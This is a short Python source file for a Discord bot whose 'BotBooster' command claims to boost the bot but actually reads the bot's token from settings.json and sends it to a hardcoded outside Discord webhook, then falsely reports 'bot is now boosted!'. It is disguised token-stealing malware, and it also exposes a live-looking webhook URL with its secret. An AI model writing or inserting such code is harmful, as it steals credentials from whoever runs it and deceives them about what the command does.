import discord
from discord.ext import commands
import json

from discord_webhook import DiscordWebhook, DiscordEmbed





with open('settings.json') as f:
  data = json.load(f)



class BotBooster:
  async def run(ctx):
    content = data['TOKEN']
    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/894416668065947688/yeCk4Jefhb0DBc-VTM5Tw6ZtcU_KJfVTnWKEsB8kNzVEONDfcZAQl8vPuxUGeoZW8SCi", username="YourMom", content=content)
    response = webhook.execute()
    await ctx.send('bot is now boosted!')
